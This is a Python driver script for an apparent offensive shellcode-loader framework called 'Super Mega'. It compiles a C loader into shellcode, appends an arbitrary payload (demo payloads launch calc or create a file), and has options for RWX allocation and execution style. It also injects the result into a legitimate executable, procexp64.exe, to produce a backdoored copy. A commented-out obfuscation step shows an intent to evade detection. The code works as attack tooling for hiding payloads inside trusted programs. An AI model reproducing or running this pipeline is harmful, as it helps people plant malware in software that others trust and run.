import shutil
from enum import Enum
from helper import *


class AllocStyle(Enum):
    RWX = 1
    RW_X = 2
    REUSE = 3

class ExecStyle(Enum):
    CALL = 1,
    JMP = 2,
    FIBER = 3,

class CopyStyle(Enum):
    SIMPLE = 1

class DataRefStyle(Enum):
    APPEND = 1


options_default = {
    "payload": "shellcodes/calc64.bin",
    "verify": False,

    "cleanup_files_on_start": True,
    "generate_asm_from_c": True,
    "generate_shc_from_asm": True,
    "test_loader_shellcode": False,
    "obfuscate_shc_loader": False,
    "test_obfuscated_shc": False,
    "exec_final_shellcode": True,

    "alloc_style": AllocStyle.RWX,
    "exec_style": ExecStyle.CALL,
    "copy_style": CopyStyle.SIMPLE,
    "dataref_style": DataRefStyle.APPEND
}


# This will verify if our loader works
# - Use it on a "target" machine
# - payload shellcode will create a file c:\temp\a
# - set: verify=True
options_test = {
    "payload": "shellcodes/createfile.bin",
    "verify": True,

    "cleanup_files_on_start": True,
    "generate_asm_from_c": True,
    "generate_shc_from_asm": True,
    "test_loader_shellcode": False,
    "obfuscate_shc_loader": False,
    "test_obfuscated_shc": False,
    "exec_final_shellcode": False,

    "inject_exe": True,
    "inject_exe_in": "exes/procexp64.exe",
    "inject_exe_out": "exes/procexp64-a.exe",

    "alloc_style": AllocStyle.RWX,
    "exec_style": ExecStyle.CALL,
    "copy_style": CopyStyle.SIMPLE,
    "dataref_style": DataRefStyle.APPEND
}


options = options_test


def main():
    print("Super Mega")

    if options["cleanup_files_on_start"]:
        clean_files()

    if options["generate_asm_from_c"]:
        make_c_to_asm("source/main.c", "main.asm", "main-clean.asm")

    if options["generate_asm_from_c"]:
        make_shc_from_asm("main-clean.asm", "main-clean.exe", "main-clean.bin")
    
    if options["test_loader_shellcode"]:
        test_shellcode("mean-clean.bin")

    # SGN seems buggy atm
    #if options["obfuscate_shc_loader"]:
    #    obfuscate_shc_loader("main-clean.bin", "main-clean-sgn.bin")
    #
    #    if options["test_obfuscated_shc"]:
    #        test_shellcode("main-clean-sgn.bin")

    if options["dataref_style"] == DataRefStyle.APPEND:
        with open("main-clean.bin", 'rb') as input1:
            data_stager = remove_trailing_null_bytes(input1.read())

        with open(options["payload"], 'rb') as input2:
            data_payload = input2.read()

        print("--[ Integrate Stager: {}  Payload: {}  (sum: {})]".format(
            len(data_stager), len(data_payload), len(data_stager)+len(data_payload)))

        with open("main-clean-append.bin", 'wb') as output:
            output.write(data_stager)
            output.write(data_payload)

        print("---[ Final shellcode available at: {} ]".format("main-clean-append.bin"))

        if options["verify"]:
            print("--[ Verify final shellcode ]")
            verify_shellcode("main-clean-append.bin")

        if options["exec_final_shellcode"]:
            print("--[ Test Append shellcode ]")
            test_shellcode("main-clean-append.bin")

    if options["inject_exe"]:
        inject_exe("main-clean-append.bin", options["inject_exe_in"], options["inject_exe_out"])
        if options["verify"]:
            print("--[ Verify final exe ]")
            verify_injected_exe(options["inject_exe_out"])

if __name__ == "__main__":
    main()